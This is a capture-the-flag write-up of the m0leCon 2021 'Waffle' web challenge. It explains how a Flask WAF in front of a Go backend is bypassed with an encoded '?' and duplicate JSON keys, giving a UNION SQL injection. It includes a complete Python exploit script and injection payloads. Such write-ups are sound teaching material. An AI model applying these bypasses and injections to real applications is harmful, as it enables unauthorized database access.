---
title: Waffle Write-up - m0leCon CTF 2021 Teaser
date: 2021-05-16
author: Yadhu Krishna M
author_url: https://twitter.com/YadhuKrishna_
categories:
 - Web Exploitation
tags:
 - SQLi
 - JSON Interoperability
---

**tl;dr**

+ Make a GET request to `/gettoken%3fcreditcard=mmm&promocode=FREEWAF` to get the token.
+ Using the token make another request with `{"name":"'  union select flag, 1, 1, 1 from flag -- -", "name":"x"}` to get the flag.

<!--more-->

**No. Of Solves:** 28

**Challenge points:** 165

**Solved By:** [Az3z3l](https://twitter.com/Az3z3l), [imp3ri0n](https://twitter.com/YadhuKrishna_), [1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_), [Captain-Kay](https://twitter.com/captainkay11)

## Challenge Description

We needed to upgrade this app but no one here can code in Go. Easy fix: just put a custom waf in front of it.

**Source Code:** [here](source-code.zip)

## Analysis

With this challenge, we are given two files in which `waf.py` acts as a front-end server, and `main.go` is as a back-end server. On opening up the website, we see that in order to use the search function, a token is needed. And, to get the token, a promo code is to be submitted. 

We have a promo code in `main.go`:

```go=
    if promo == "FREEWAF"{
        cookie    :=    http.Cookie{Name:"token",Value:token}
        http.SetCookie(w, &cookie)
        JSONmessage(w,200,"Take your free token!")
        return
    }
```

However, this promo code is blocked by the flask front-end server, and is not passed on to the back-end server.

```python=
def catch_all(path):
    print(path, unquote(path))
    
    if('gettoken' in unquote(path)):
        promo = request.args.get('promocode')
        creditcard = request.args.get('creditcard')

        if promo == 'FREEWAF':
            res = jsonify({'err':'Sorry, this promo has expired'})
            res.status_code = 400
            return res

        r = requests.get(appHost+path, params={'promocode':promo,'creditcard':creditcard})

    else:
        r = requests.get(appHost+path)
    
    headers = [(name, value) for (name, value) in r.raw.headers.items()]
    res = Response(r.content, r.status_code, headers)
    return res
```
There is also a possibility of SQL Injection in the `searchWaffle` function in `main.go`, as the variable is directly concatenated with the SQL query.

```golang=
    query := "SELECT name, radius, height, img_url FROM waffle "
    var nFilt = 0

    name, err := jsonparser.GetString(reqBody,"name")
    if (err==nil){
        nFilt++
        query += "WHERE name = '" + name + "' "
    }

```


Now, our aim is clear. We first need to the front-end server to forward the `promocode` to the back-end server and get the token. Then, with the token, we have to exploit the SQL Injection in `main.go`.


## Solution

### Extracting Token

The `catch_all` function, uses urllib's unquote method to replace %xx escapes with their single-character equivalent. It then uses `request.args` to get values from the parameters. 

```python=

def catch_all(path):
    print(path, unquote(path))
    
    if('gettoken' in unquote(path)):
        promo = request.args.get('promocode')
        creditcard = request.args.get('creditcard')

        if promo == 'FREEWAF':
            res = jsonify({'err':'Sorry, this promo has expired'})
            res.status_code = 400
            return res

        r = requests.get(appHost+path, params={'promocode':promo,'creditcard':creditcard})

    else:
        r = requests.get(appHost+path)
    
    headers = [(name, value) for (name, value) in r.raw.headers.items()]
    res = Response(r.content, r.status_code, headers)
    return res
```

To bypass these checks, we urlencode the `?`, and make a get request to `/gettoken%3fcreditcard=x&promocode=FREEWAF`. With this, the Flask server does not detect any arguments. 

Both `promo` and `creditcard` variables will be`None` and the variable `path` will contain `gettoken?creditcard=mmm&promocode=FREEWAF`. This bypasses the checks and forwards the request to the back-end server, and we get the token.

`token=LQuKU5ViVGk4fsytWt9C`

Now, we have obtained access to search method.

### Exploiting SQL Injection

We have already identified that there is a possibility for SQL Injection in `searchWaffle` method in `main.go`. However, there are some checks implemented in the front-end server for mitigating this.

```python=
@app.route('/search', methods=['POST'])
def search():
    j = request.get_json(force=True)
    
    badReq = False
    if 'name' in j:
        x = j['name']
        if not isinstance(x, str) or not x.isalnum():
            badReq = True
    if 'min_radius' in j:
        x = j['min_radius']
        if not isinstance(x, int):
            badReq = True
    if 'max_radius' in j:
        x = j['max_radius']
        if not isinstance(x, int):
            badReq = True

    if badReq:
        res = jsonify({'err':'Bad request, filtered'})
        res.status_code = 400
        return res
```

The `search` method in the front-end server uses Flask's JSON parser whereas the back-end server uses a custom JSON parser. 

There can be differences in how different JSON parsers parse data. And this could lead to inconsistency. This is called JSON interoperability (Read more about this [here](https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities)). 

```json=
{
    "name":"'  union select flag, 1, 1, 1 from flag -- -",
    "name":"x",
    "min_radius":1,
    "max_radius":10
}
```

The JSON Parser at front-end takes the second value of `name` whereas the back-end JSON parser takes the first value for `name`. This helps us to bypass the checks and this causes in an SQL Injection in back-end.

## Exploit Script

```python=
import requests

sess = requests.Session()
host = "http://waffle.challs.m0lecon.it"

sess.get(host + "/gettoken%3fcreditcard=x&promocode=FREEWAF")

print(f"Recieved token: {sess.cookies['token']}")

payload = """{"name":"'  union select flag, 1, 1, 1 from flag -- -","name":"x"}"""
flag = sess.post(host + "/search", data=payload)

print(f"Flag: {flag.json()[0]['name']}")
```

## Flag

```
ptm{n3ver_ev3r_tru5t_4_pars3r!}
```
